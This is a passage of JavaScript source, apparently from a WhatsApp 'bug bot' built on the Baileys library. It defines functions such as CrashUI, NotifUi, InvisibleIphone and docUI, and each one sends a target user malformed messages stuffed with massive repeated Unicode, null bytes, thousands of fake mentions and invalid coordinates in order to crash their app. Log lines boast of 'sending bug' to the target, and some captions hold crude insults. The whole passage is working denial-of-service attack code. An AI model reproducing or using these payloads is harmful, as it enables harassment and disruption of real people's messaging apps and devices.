    };

    await sock.relayMessage(target, msg, {});
    console.log(`TREVOSIUM MENGIRIM BUG TO ${target}`);

    const msg2 = {
      botInvokeMessage: {
        newsletterAdminInviteMessage: {
          newsletterJid: "3333333333@newsletter",
          newsletterName: "🧬⃟༑🩸>" + "ꦾꦽꦿꦾꦽ".repeat(60000),
            jpegThumbnail: null,
            caption: "ꦾꦽꦿꦾꦽ".repeat(60000) + "ោ៝".repeat(25000) + "𑜦𑜠".repeat(15000),
          inviteExpiration: Date.now() + 999999999
        }
      }
    };

    await sock.relayMessage(target, msg2, {});
    console.log(`TREVOSIUM MENGIRIM BUG TO ${target}`);

  } catch (err) {
    console.error("error:", err);
  }
}

async function stcPckx(sock, target) {  
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "ꦾ".repeat(50000),
          publisher: "ꦾ".repeat(50000),
          caption: " r4Ldz`impõssible. ",
          stickers: [
            ...Array.from({ length: 100 }, () => ({
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🦠", "🩸"],
              accessibilityLabel: "",
              stickerSentTs: "PnX-ID-msg",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }))
          ],
          fileLength: "1073741824000",
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
          contextInfo: {
            remoteJid: "X",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9999999) +
                  "@s.whatsapp.net"
              ),
            ],
          },
          packDescription: "",
          mediaKeyTimestamp: "1747502082",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "999999999",
          stickerPackOrigin: "USER_CREATED",
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, msg.message, {
    participant: { 
      jid: target 
    }, 
    messageId: msg.key.id, 
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "3",
              name: "galaxy_message"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  })
}


//=====( Crash Ui )=====\\
async function NotifUi(target) {
const location = {
locationMessage: {
degreesLatitude: -99,
degreesLongitude: -99,
name: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ".repeat(15000),
address: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦽ".repeat(15000),
},
};

const LiveXLoca = {
liveLocationMessage: {
degreesLatitude: 77,
degreesLongitude: -77,
name: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ោ៝".repeat(10000),
address: "X7" + "ꦽ".repeat(15000) + "ꦾ".repeat(10000),
},
};

const msg = await generateWAMessageFromContent(target, LiveXLoca, location, {});

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target },
statusJidList: [target]
});
}

async function notifandroid(sock, target) {
    try { 
        const extendedTextMessage = {
            text: "ꦾ".repeat(180000),
            title: "ꦾ".repeat(60000),
            contextInfo: {
                stanzaId: "X",
                participant: target,
                remoteJid: target,
                isForwarded: true,
                forwardingScore: 999,
                mentionedJid: [
                    "13135550202@s.whatsapp.net",
                    ...Array.from(
                        { length: 2000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    )
                ],
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "ꦾ".repeat(50000)
                }
            }
        };
        
        await sock.sendMessage(target, {
            extendedTextMessage
        });

        await sock.relayMessage(target, {
            groupId: null,
            participant: { jid: target }
        });

        console.log(chalk.red(`Succes Sending Bug Crashui To ${target}`));
        
    } catch (error) {
        console.error("Error:", error);
    }
}

async function Notifcrash(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦽ".repeat(20000),
        url: "https://t.me/" + "Xavienzz" + "ꦽ".repeat(20000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "ꦽ".repeat(20000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦽ".repeat(20000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.sendMessage(target, msg.message, {
    messageId: msg.key?.id,
    quoted: null
  });
}

async function CrashUI(sock, target) {
  try {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ࣯࣯".repeat(6500) + "@1313555003".repeat(50000),
        contextInfo: {
          mentionedJid: [target],
          participant: target,
          forwardingScore: 9471,
          isForwarded: true,
          fromMe: false,
        }
      }
    }, { messageId: null, participant: { jid: target } });
    await new Promise((r) => setTimeout(r, 2500));
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {
                degreesLatitude: -992.999999999,
                degreesLongitude: 123.456789999,
              },
              hasMediaAttachment: true
            },
            contextInfo: {
              remoteJid: "status@broadcast",
              quotedMessage: {
                paymentInviteMessage: 2,
                expiryTimestamp: 8 * 1840000
              }
            },
            body: {
              text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ࣯࣯".repeat(2500) +  "ꦽ".repeat(2500) + "@0".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [{
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              }, {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              }]
            }
          }
        }
      }
    }, { messageId: null, participant: { jid: target } });
  } catch (r) {
    console.log(r);
  }
}

async function Lontionwolker(target) {
  console.log(chalk.red(`Succes Sending Bug Crashui To ${target}`));
  
  const wolker = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦽ".repeat(40000),
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({
                flow_cta: "\u0000".repeat(124000),
              }),
              version: 3,
            },
          },
          nativeFlowResponseMessage: {
            groupInviteMessage: {
              groupJid: "1203630XXXXXXX@g.us",
              inviteCode: "AbCdEfGhIjKlMnOp",
              inviteExpiration: 10000000,
              groupName: "Trevosium Area",
              jpegThumbnail: null,
              caption: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
            },
          },
        },
      },
    },
  };

  let msg2 = {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𑜦𑜠".repeat(50000),
                format: "DEFAULT",
              },
              contextInfo: {
                mentionedJid: [
                  ...Array.from({ length: 1999 }, () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "917267@s.whatsapp.net"
                  ),
                ],
                isForwarded: true,
                forwardingScore: 999,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "696969696969@newsletter",
                  serverMessageId: 1,
                  newsletterName: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
                },
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{}".repeat(24000),
                version: 3,
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  in_pin_code: "7205",
                  orderId: "4U7S4RWPS3C",
                  itemCount: 999999999,
                  status: "DELIVERED",
                  surface: 2,
                  sellerJid: "x",
                  totalAmount1000: 60000000000,
                  currencyCodeIso4217: "IDR",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3",
                }),
              },
            },
            quotedMessage: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  version: 3,
                  name: "call_permission_request",
                  paramsJson: "\u0000".repeat(124000),
                },
                body: {
                  text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
                  format: "DEFAULT",
                },
                StatusAttributionType: 1,
                forwardedAiBotMessageInfo: {
                  botName: "Meta",
                  botJid: "13135550002@s.whatsapp.net",
                  creatorName: "trevosium",
                },
                externalAdReply: {
                  showAdAttribution: false,
                  renderLargerThumbnail: true,
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null,
                  },
                },
                thumbnailHeight: 480,
                thumbnailWidth: 339,
                caption: "ꦾ".repeat(14000),
              },
            },
          },
        },
      },
    },
  };

  const msg = await generateWAMessageFromContent(target, wolker, {
    userJid: target,
  });

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function docUI(sock, target) {
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileName: "Xavienzz.Doc", 
      fileLength: 9999999999,
      pageCount: 99999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      caption: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦽ".repeat(60000),
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      contextInfo: {
        participant: target, 
        quotedMessage: {
          conversation: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ"
        }, 
        remoteJid: "status@broadcast"
      }, 
      mediaKeyTimestamp: 7205189532
    }
  }), {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function killeruimsg(sock, target) {
  const msg = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),                         
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  };

  const mgsui = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
            hasMediaAttachment: false,
          },
          body: {
            text: "MAKLOE YAPIT" +
                   "꧀".repeat(10000) + 
                   "ꦽ".repeat(30000),
          },
          footer: {
            text: '🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ' + '@1'.repeat(10000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_catalog",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: ".",
              },
              {
                name: "cta_url",
                buttonParamsJson: "\u0003",
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          },
          contextInfo: {
            stanzaId: "Xavienz.Archive-id" + Date.now(),
            isForwarded: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            quotedMessage: {
              groupInviteMessage: {
                groupJid: "9919192929@g.us",
                groupName: "ꦽ".repeat(20000),
                inviteExpiration: Date.now() + 181440000000,
                caption: "Trevosium Is Here",
                jpegThumbnail: null,
              },
            },
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, msg, { messageId: Date.now().toString() });
  await sock.relayMessage(target, mgsui, { messageId: (Date.now() + 1).toString() });
}

//====( Invisible iPhone )=====\\

async function InvisibleIphone(target) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇׁׅ݊",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 64,
        thumbnailWidth: 60,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

async function TrashLocaIos(target) {
  const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿";
  
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: slash,
         name: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇׁׅ݊" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇׁׅ݊" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://xavienzz-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + TrashIosx, 
      }
      
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
    
  await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
                content: undefined
               }]
            }]
        }]
    });
    await sleep(5000)
 }
 
 async function exoticsIPV2(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
    }, {});
    
   await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "ven.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
          title: "@Xavienzz",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/Xavienzz",
         mediaUrl: "https://t.me/Xavienzz",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: target }
 });
 
  await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}
  
async function IpongSepong(sock, target) {
  const locationMessage = {
    locationMessage: {
      degreesLatitude: 991.2772992,
      degreesLongtitude: 11.2782999,
      name: "\u0010" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0010" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      url: `https://Xavienzz-tech/${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    },
  };
  
  const extendedTextMessage = {
  	extendedTextMessage: {
		  text: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ" + "𑇂𑆵𑆴𑆿".repeat(60000),
				contextInfo: {
							stanzaId: "1234567890ABCDEF",
							participant: "6285769675679@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										target: "6285769675679@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remotetarget: target,
							conversionSource: "source_example",
							conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: "Example Advertiser",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: "raven kontol gede"
							},
							placeholderKey: {
								remotetarget: "6285769675679@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "raven ah ah ah",
								body: "raven kontollllll",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewTtpe: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://t.me/rvnn6",
								mediaUrl: "https://t.me/rvnn6",
								containsAutoReply: true,
								renderLargerThumbnail: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
